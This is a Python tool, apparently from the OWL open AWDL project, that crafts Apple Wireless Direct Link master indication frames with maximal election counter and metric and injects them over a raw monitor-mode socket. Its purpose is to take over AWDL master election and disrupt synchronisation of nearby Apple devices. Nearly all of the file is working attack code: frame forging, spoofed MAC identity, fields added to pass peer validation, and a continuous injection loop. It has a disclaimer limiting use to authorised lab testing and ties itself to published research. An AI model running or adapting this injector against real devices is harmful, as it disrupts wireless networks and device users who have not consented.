#!/usr/bin/env python3
# OWL: an open Apple Wireless Direct Link (AWDL) implementation
# Copyright (C) 2018  The Open Wireless Link Project
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
"""Craft and inject AWDL Master Indication Frames (MIF) that win the election.

This is a research / testing companion for the OWL (Open Wireless Link)
project.  It builds AWDL action frames byte-for-byte compatible with the
frames produced by ``src/tx.c`` and injects them on a monitor-mode Wi-Fi
interface, directed at one specific destination MAC address.

The frames carry Election Parameters (v1 *and* v2) with a maximal election
*counter* and *metric*.  Per AWDL's election rule -- reimplemented in
``src/election.c`` (``awdl_election_compare_master``: compare the master
counter first, then the master metric, higher wins) -- a node advertising
0xFFFFFFFF for both can never be out-voted by a peer whose counter starts at
0 and only increments once every ~3.14 s.  The injected node therefore
*guarantees* it becomes (and stays) the AWDL master / sync root that the
target synchronises to.

How the target is made to accept us as a valid peer (see
``awdl_peer_is_valid`` in ``src/peers.c``: ``sent_mif && devclass &&
version``):
  * we send a MIF (action subtype 3)            -> sets ``sent_mif``
  * we include a Version TLV (type 21)          -> sets ``version`` + ``devclass``
  * we include an Election Parameters v2 TLV     -> drives the election

================================  AUTHORISED USE  ============================
AWDL is an always-on protocol on Apple devices.  Forcing a foreign master
disrupts the synchronisation of every node in radio range, so run this ONLY
against devices you own or are explicitly authorised to test, in an isolated
RF lab environment.  This mirrors the attacks studied by the OWL authors in
"A Billion Open Interfaces for Eve and Mallory" (USENIX Security '19).  Like
the rest of OWL it is experimental software -- use it at your own risk.
=============================================================================

Requirements: Linux, Python 3.6+, root, and a Wi-Fi card in monitor mode on
the right social channel (6, 44 or 149).  No third-party modules needed.

Example:
    # put the card into monitor mode on channel 44 first, e.g.:
    #   sudo ip link set wlan0 down
    #   sudo iw dev wlan0 set type monitor
    #   sudo ip link set wlan0 up
    #   sudo iw dev wlan0 set channel 44
    sudo ./awdl_master_inject.py -i wlan0 -t 11:22:33:44:55:66 -c 44
"""

import argparse
import fcntl
import os
import random
import signal
import socket
import struct
import sys
import time

# ---------------------------------------------------------------------------
# AWDL / IEEE 802.11 constants (kept in sync with src/*.h)
# ---------------------------------------------------------------------------

AWDL_OUI = b"\x00\x17\xf2"                       # src/frame.h  AWDL_OUI
AWDL_BSSID = b"\x00\x25\x00\xff\x94\x73"         # src/frame.h  AWDL_BSSID
AWDL_TYPE = 8                                    # src/frame.h  AWDL_TYPE
AWDL_VERSION_COMPAT = 0x10                       # awdl_version(1, 0)
IEEE80211_VENDOR_SPECIFIC = 127

# Action subtypes (enum awdl_action_type)
AWDL_ACTION_PSF = 0
AWDL_ACTION_MIF = 3

# TLV type values (enum awdl_tlvs)
AWDL_SYNCHRONIZATON_PARAMETERS_TLV = 4
AWDL_ELECTION_PARAMETERS_TLV = 5
AWDL_SERVICE_PARAMETERS_TLV = 6
AWDL_ENHANCED_DATA_RATE_CAPABILITIES_TLV = 7
AWDL_DATA_PATH_STATE_TLV = 12
AWDL_ARPA_TLV = 16
AWDL_CHAN_SEQ_TLV = 18
AWDL_VERSION_TLV = 21
AWDL_ELECTION_PARAMETERS_V2_TLV = 24

# 802.11 frame control: management + action (src/ieee80211.h)
IEEE80211_FTYPE_MGMT = 0x0000
IEEE80211_STYPE_ACTION = 0x00D0
FRAME_CONTROL_ACTION = IEEE80211_FTYPE_MGMT | IEEE80211_STYPE_ACTION

# Channel sequence (src/channel.{c,h})
AWDL_CHANSEQ_LENGTH = 16
AWDL_CHAN_ENC_OPCLASS = 3

# Social channels -> (channel number, operating class) as in CHAN_OPCLASS_*
CHAN_OPCLASS = {
    6:   (6,   0x51),
    44:  (44,  0x80),
    149: (149, 0x80),
}

# Device classes (enum awdl_devclass)
AWDL_DEVCLASS_MACOS = 1
AWDL_DEVCLASS_IOS = 2
AWDL_DEVCLASS_TVOS = 8

# Sync defaults (src/sync.c  awdl_sync_state_init / src/state.c)
AW_PERIOD_TU = 16
PRESENCE_MODE = 4
PSF_INTERVAL_MASTER_TU = 110

UINT32_MAX = 0xFFFFFFFF

BROADCAST = b"\xff\xff\xff\xff\xff\xff"


# ---------------------------------------------------------------------------
# small helpers
# ---------------------------------------------------------------------------

def parse_mac(text):
    """Parse ``aa:bb:cc:dd:ee:ff`` (or ``-``/``.`` separated) into 6 bytes."""
    cleaned = text.replace("-", ":").replace(".", ":").strip()
    parts = cleaned.split(":")
    if len(parts) != 6:
        raise argparse.ArgumentTypeError("MAC address must have 6 octets: %r" % text)
    try:
        octets = bytes(int(p, 16) for p in parts)
    except ValueError:
        raise argparse.ArgumentTypeError("invalid hex in MAC address: %r" % text)
    return octets


def mac_str(raw):
    return ":".join("%02x" % b for b in raw)


def get_iface_mac(ifname):
    """Return the hardware address of ``ifname`` as 6 bytes, or None."""
    try:
        with open("/sys/class/net/%s/address" % ifname) as fh:
            return parse_mac(fh.read().strip())
    except (OSError, argparse.ArgumentTypeError):
        return None


def random_local_mac():
    """A random locally-administered, unicast MAC (bit0=0 unicast, bit1=1 local)."""
    first = (random.randint(0, 255) & 0xFC) | 0x02
    return bytes([first] + [random.randint(0, 255) for _ in range(5)])


def usec_to_tu(usec):
    return usec // 1024


# 1 TU (time unit) = 1024 us, per IEEE 802.11 (src/ieee80211.h)
_TIME_UNITS = {"us": 1e-6, "ms": 1e-3, "tu": 1024e-6, "s": 1.0}


def parse_duration(text):
    """Parse a time value into seconds.

    Accepts a bare number (seconds) or a value with a unit suffix:
    ``s`` (seconds), ``ms`` (milliseconds), ``us`` (microseconds) or
    ``tu`` (802.11 time units, 1 TU = 1024 us).  Examples: ``0.5``,
    ``500ms``, ``110tu``.
    """
    token = str(text).strip().lower()
    multiplier = 1.0
    for suffix in ("ms", "us", "tu", "s"):   # check two-char suffixes before "s"
        if token.endswith(suffix) and token[:-len(suffix)]:
            multiplier = _TIME_UNITS[suffix]
            token = token[:-len(suffix)]
            break
    try:
        value = float(token)
    except ValueError:
        raise argparse.ArgumentTypeError("invalid time value: %r" % text)
    if value < 0:
        raise argparse.ArgumentTypeError("time value must not be negative: %r" % text)
    return value * multiplier


# ---------------------------------------------------------------------------
# frame construction (mirrors src/tx.c)
# ---------------------------------------------------------------------------

class AwdlFrameBuilder:
    """Builds AWDL action frames identical in layout to ``src/tx.c``."""

    def __init__(self, src, dst, channel, master_metric, master_counter,
                 self_metric, self_counter, hostname, devclass,
                 aw_period=AW_PERIOD_TU, af_period=PSF_INTERVAL_MASTER_TU,
                 presence_mode=PRESENCE_MODE):
        self.src = src
        self.dst = dst
        self.channel = channel
        self.master_metric = master_metric & UINT32_MAX
        self.master_counter = master_counter & UINT32_MAX
        self.self_metric = self_metric & UINT32_MAX
        self.self_counter = self_counter & UINT32_MAX
        self.hostname = hostname
        self.devclass = devclass

        # AWDL timing parameters advertised in the Sync Parameters TLV.
        self.aw_period = aw_period            # Availability Window period (TU)
        self.af_period = af_period            # action-frame / PSF period (TU)
        self.presence_mode = presence_mode    # EAW multiplier (steps per EAW)

        # We advertise ourselves as the top master: distance 0, master == self.
        self.master_addr = src
        self.sync_addr = src
        self.height = 0

        self._seq = 0                       # 802.11 sequence number (12 bit)
        self._t0 = time.monotonic_ns() // 1000  # us reference (like clock_time_us)

    # -- radiotap ----------------------------------------------------------
    @staticmethod
    def _radiotap_header():
        # Matches ieee80211_init_radiotap_header(): present = RATE bit (1<<2),
        # one rate byte = 2 * 12 = 24 (i.e. 12 Mbit/s).  Total length 9.
        present = 1 << 2            # IEEE80211_RADIOTAP_RATE
        rate = 2 * 12
        hdr = struct.pack("<BBHI", 0, 0, 9, present)
        return hdr + struct.pack("<B", rate)

    # -- 802.11 + action headers ------------------------------------------
    def _ieee80211_hdr(self):
        seq_ctrl = (self._seq & 0x0FFF) << 4
        self._seq = (self._seq + 1) & 0x0FFF
        return struct.pack("<HH", FRAME_CONTROL_ACTION, 0) + \
            self.dst + self.src + AWDL_BSSID + struct.pack("<H", seq_ctrl)

    def _awdl_action(self, subtype):
        steady = (time.monotonic_ns() // 1000) & UINT32_MAX
        return struct.pack("<B3sBBBBII",
                           IEEE80211_VENDOR_SPECIFIC, AWDL_OUI, AWDL_TYPE,
                           AWDL_VERSION_COMPAT, subtype, 0, steady, steady)

    # -- channel sequence block (awdl_init_chanseq) -----------------------
    def _chanseq_block(self):
        chan_num, opclass = CHAN_OPCLASS[self.channel]
        block = struct.pack("<BBBBH",
                            AWDL_CHANSEQ_LENGTH - 1,    # count (+1)
                            AWDL_CHAN_ENC_OPCLASS,      # encoding
                            0,                          # duplicate_count
                            self.presence_mode - 1,     # step_count (presence_mode-1)
                            0xFFFF)                     # fill_channel
        entry = bytes([chan_num, opclass])              # opclass encoding = 2 bytes
        return block + entry * AWDL_CHANSEQ_LENGTH

    # -- Synchronization Parameters TLV (type 4) --------------------------
    def _sync_params_tlv(self):
        now = time.monotonic_ns() // 1000
        chan_num, _ = CHAN_OPCLASS[self.channel]

        eaw_period = self.presence_mode * self.aw_period
        time_since = usec_to_tu(now - self._t0)
        tx_down_counter = eaw_period - (time_since % eaw_period)
        current_aw = (0 + (time_since % eaw_period) // self.aw_period +
                      self.presence_mode * (time_since // eaw_period)) & 0xFFFF

        aw_com_length = self.aw_period
        consumed = self.aw_period * self.presence_mode - tx_down_counter
        remaining = 0 if aw_com_length < consumed else aw_com_length - consumed

        body = struct.pack(
            "<BHBBH"     # next_aw_channel, tx_down_counter, master_channel, guard_time, aw_period
            "HHHHH"      # af_period, flags, aw_ext_length, aw_com_length, remaining_aw_length
            "BBBB"       # min_ext, max_ext_multicast, max_ext_unicast, max_ext_af
            "6sBBHH",    # master_addr, presence_mode, reserved, next_aw_seq, ap_alignment
            chan_num,                       # next_aw_channel
            tx_down_counter & 0xFFFF,
            chan_num,                       # master_channel
            0,                              # guard_time
            self.aw_period,                 # aw_period
            self.af_period,                 # af_period
            0x1800,                         # flags
            self.aw_period,                 # aw_ext_length
            aw_com_length,                  # aw_com_length
            remaining & 0xFFFF,             # remaining_aw_length
            self.presence_mode - 1,         # min_ext
            self.presence_mode - 1,         # max_ext_multicast
            self.presence_mode - 1,         # max_ext_unicast
            self.presence_mode - 1,         # max_ext_af
            self.master_addr,               # master_addr (== self, we are master)
            self.presence_mode,             # presence_mode
            0,                              # reserved
            current_aw,                     # next_aw_seq
            current_aw,                     # ap_alignment
        )
        body += self._chanseq_block()
        body += b"\x00\x00"                 # padding (tx.c)
        return self._tlv(AWDL_SYNCHRONIZATON_PARAMETERS_TLV, body)

    # -- Election Parameters TLV v1 (type 5) ------------------------------
    def _election_params_tlv(self):
        body = struct.pack(
            "<BHBB6sII",
            0,                      # flags
            0,                      # id
            self.height,            # distancetop
            0,                      # unknown
            self.master_addr,       # top_master_addr
            self.master_metric,     # top_master_metric
            self.self_metric,       # self_metric
        ) + b"\x00\x00"            # pad[2]
        return self._tlv(AWDL_ELECTION_PARAMETERS_TLV, body)

    # -- Election Parameters TLV v2 (type 24) -- THE DECIDING TLV ----------
    def _election_params_v2_tlv(self):
        # Field order & offsets match struct awdl_election_params_v2_tlv and
        # the reader awdl_handle_election_params_v2_tlv() in src/rx.c.
        body = struct.pack(
            "<6s6sIIIIIII",
            self.master_addr,       # master_addr
            self.sync_addr,         # sync_addr
            self.master_counter,    # master_counter  (compared FIRST -> max)
            self.height,            # distance_to_master (0 -> we are the root)
            self.master_metric,     # master_metric   (compared SECOND -> max)
            self.self_metric,       # self_metric
            0,                      # unknown
            0,                      # reserved
            self.self_counter,      # self_counter
        )
        return self._tlv(AWDL_ELECTION_PARAMETERS_V2_TLV, body)

    # -- Channel Sequence TLV (type 18) -----------------------------------
    def _chanseq_tlv(self):
        body = self._chanseq_block() + b"\x00\x00\x00"   # 3 padding bytes (tx.c)
        return self._tlv(AWDL_CHAN_SEQ_TLV, body)

    # -- Service Parameters TLV (type 6) ----------------------------------
    def _service_params_tlv(self):
        body = struct.pack("<3sHI", b"\x00\x00\x00", 0, 0)
        return self._tlv(AWDL_SERVICE_PARAMETERS_TLV, body)

    # -- HT Capabilities TLV (type 7) -------------------------------------
    def _ht_capabilities_tlv(self):
        body = struct.pack("<HHBBH", 0, 0x11ce, 0x1b, 0xff, 0)
        return self._tlv(AWDL_ENHANCED_DATA_RATE_CAPABILITIES_TLV, body)

    # -- Arpa (hostname) TLV (type 16) ------------------------------------
    def _arpa_tlv(self):
        name = self.hostname.encode("utf-8")[:63]
        body = struct.pack("<BB", 3, len(name)) + name + struct.pack(">H", 0xc00c)
        return self._tlv(AWDL_ARPA_TLV, body)

    # -- Data Path State TLV (type 12) ------------------------------------
    def _data_path_state_tlv(self):
        if self.channel == 6:
            social = 0x0001
        elif self.channel == 44:
            social = 0x0002
        else:                      # 149
            social = 0x0004
        body = struct.pack("<H3sH6sH",
                           0x8f24,              # flags
                           b"X0\x00",           # country_code
                           social,              # social_channels
                           self.src,            # awdl_addr
                           0x0000)              # ext_flags
        return self._tlv(AWDL_DATA_PATH_STATE_TLV, body)

    # -- Version TLV (type 21) -- needed to make the peer "valid" ----------
    def _version_tlv(self):
        body = struct.pack("<BB", 0x34, self.devclass)   # version 3.4, devclass
        return self._tlv(AWDL_VERSION_TLV, body)

    # -- generic TLV header ------------------------------------------------
    @staticmethod
    def _tlv(tlv_type, body):
        return struct.pack("<BH", tlv_type, len(body)) + body

    # -- full frame --------------------------------------------------------
    def build(self, subtype=AWDL_ACTION_MIF):
        """Assemble a complete injectable frame (radiotap + 802.11 + AWDL)."""
        frame = self._radiotap_header()
        frame += self._ieee80211_hdr()
        frame += self._awdl_action(subtype)
        frame += self._sync_params_tlv()
        frame += self._election_params_tlv()
        frame += self._chanseq_tlv()
        frame += self._election_params_v2_tlv()
        frame += self._service_params_tlv()
        if subtype == AWDL_ACTION_MIF:
            frame += self._ht_capabilities_tlv()
            frame += self._arpa_tlv()
        frame += self._data_path_state_tlv()
        frame += self._version_tlv()
        # No FCS: OWL injects with ieee80211_state->fcs == 0; mac80211 adds it.
        return frame


# ---------------------------------------------------------------------------
# injection
# ---------------------------------------------------------------------------

def open_injection_socket(ifname):
    """Open a raw AF_PACKET socket bound to a monitor-mode interface."""
    try:
        sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
        sock.bind((ifname, 0))
    except PermissionError:
        sys.exit("error: need root to open a raw socket (try sudo)")
    except OSError as exc:
        sys.exit("error: cannot bind to interface %r: %s" % (ifname, exc))
    return sock


DEVCLASS_NAMES = {
    "macos": AWDL_DEVCLASS_MACOS,
    "ios": AWDL_DEVCLASS_IOS,
    "tvos": AWDL_DEVCLASS_TVOS,
}


def main(argv=None):
    parser = argparse.ArgumentParser(
        description="Inject AWDL MIF frames that guarantee winning the election "
                    "(become AWDL master), directed at a specific MAC address.",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument("-i", "--interface", required=True,
                        help="monitor-mode Wi-Fi interface to inject on")
    parser.add_argument("-t", "--target", required=True, type=parse_mac,
                        help="destination MAC address the frames are directed at "
                             "(use ff:ff:ff:ff:ff:ff to broadcast)")
    parser.add_argument("-s", "--source", type=parse_mac, default=None,
                        help="source MAC / master identity to advertise "
                             "(default: interface MAC, else random local MAC)")
    parser.add_argument("-c", "--channel", type=int, default=44,
                        choices=sorted(CHAN_OPCLASS), help="AWDL social channel")
    parser.add_argument("--metric", type=lambda x: int(x, 0), default=UINT32_MAX,
                        help="election master metric (default: 0xffffffff = max)")
    parser.add_argument("--counter", type=lambda x: int(x, 0), default=UINT32_MAX,
                        help="election master counter (default: 0xffffffff = max)")
    parser.add_argument("--hostname", default="owl-master",
                        help="hostname advertised in the Arpa TLV")
    parser.add_argument("--devclass", choices=sorted(DEVCLASS_NAMES),
                        default="macos", help="advertised device class")
    parser.add_argument("--count", type=int, default=0,
                        help="number of frames to send (0 = until interrupted)")

    timing = parser.add_argument_group(
        "timing", "control the send cadence and the AWDL timing parameters "
                  "advertised in the Sync Parameters TLV")
    timing.add_argument("--interval", type=parse_duration, default=1.0,
                        metavar="TIME",
                        help="time between send cycles; accepts an s/ms/us/tu "
                             "suffix (e.g. 0.5, 500ms, 110tu). 0 = send once")
    timing.add_argument("--duration", type=parse_duration, default=0,
                        metavar="TIME",
                        help="stop after this much time (same unit suffixes; "
                             "0 = run until --count or Ctrl-C)")
    timing.add_argument("--aw-period", type=int, default=AW_PERIOD_TU,
                        metavar="TU",
                        help="advertised Availability Window period in TU")
    timing.add_argument("--af-period", type=int, default=PSF_INTERVAL_MASTER_TU,
                        metavar="TU",
                        help="advertised action-frame (PSF) period in TU")
    timing.add_argument("--presence-mode", type=int, default=PRESENCE_MODE,
                        metavar="N",
                        help="advertised presence mode / EAW multiplier; values "
                             "other than 4 may be rejected by OWL peers")
    parser.add_argument("--psf", action="store_true",
                        help="also interleave PSF frames (default: MIF only)")
    parser.add_argument("--dry-run", action="store_true",
                        help="build and hex-dump one frame without injecting")
    args = parser.parse_args(argv)

    # Validate the timing parameters (they must fit the on-wire fields).
    if not 1 <= args.presence_mode <= 16:
        parser.error("--presence-mode must be between 1 and 16")
    if not 1 <= args.aw_period <= 0xFFFF:
        parser.error("--aw-period must be between 1 and 65535 TU")
    if not 1 <= args.af_period <= 0xFFFF:
        parser.error("--af-period must be between 1 and 65535 TU")

    src = args.source
    if src is None:
        src = get_iface_mac(args.interface) or random_local_mac()

    metric = args.metric & UINT32_MAX
    counter = args.counter & UINT32_MAX

    builder = AwdlFrameBuilder(
        src=src, dst=args.target, channel=args.channel,
        master_metric=metric, master_counter=counter,
        self_metric=metric, self_counter=counter,
        hostname=args.hostname, devclass=DEVCLASS_NAMES[args.devclass],
        aw_period=args.aw_period, af_period=args.af_period,
        presence_mode=args.presence_mode,
    )

    if args.dry_run:
        frame = builder.build(AWDL_ACTION_MIF)
        print("# source (master) : %s" % mac_str(src))
        print("# target (dst)    : %s" % mac_str(args.target))
        print("# channel         : %d" % args.channel)
        print("# election counter : 0x%08x" % counter)
        print("# election metric  : 0x%08x" % metric)
        print("# aw/af period     : %d / %d TU" % (args.aw_period, args.af_period))
        print("# presence mode    : %d" % args.presence_mode)
        print("# MIF frame length : %d bytes" % len(frame))
        print(frame.hex())
        return 0

    sock = open_injection_socket(args.interface)

    # graceful Ctrl-C
    stop = {"flag": False}
    signal.signal(signal.SIGINT, lambda *_: stop.update(flag=True))

    print("[*] injecting AWDL MIF on %s (ch %d)" % (args.interface, args.channel))
    print("    master   : %s  (counter=0x%08x metric=0x%08x)"
          % (mac_str(src), counter, metric))
    print("    directed at: %s" % mac_str(args.target))
    print("    timing   : interval=%s aw=%dTU af=%dTU presence=%d%s"
          % ("once" if args.interval <= 0 else "%gms" % (args.interval * 1000),
             args.aw_period, args.af_period, args.presence_mode,
             "" if args.duration <= 0 else " duration=%gs" % args.duration))
    print("    (Ctrl-C to stop)")

    start = time.monotonic()
    deadline = start + args.duration if args.duration > 0 else None
    sent = 0
    try:
        while not stop["flag"]:
            sock.send(builder.build(AWDL_ACTION_MIF))
            sent += 1
            if args.psf:
                sock.send(builder.build(AWDL_ACTION_PSF))
                sent += 1

            if args.count and sent >= args.count:
                break
            if args.interval <= 0:
                break
            if deadline is not None and time.monotonic() >= deadline:
                break

            # sleep in small slices so Ctrl-C (and the deadline) stay responsive
            slept = 0.0
            while slept < args.interval and not stop["flag"]:
                if deadline is not None and time.monotonic() >= deadline:
                    break
                step = min(0.1, args.interval - slept)
                time.sleep(step)
                slept += step
    finally:
        sock.close()

    print("\n[*] done, sent %d frame(s)" % sent)
    return 0


if __name__ == "__main__":
    sys.exit(main())
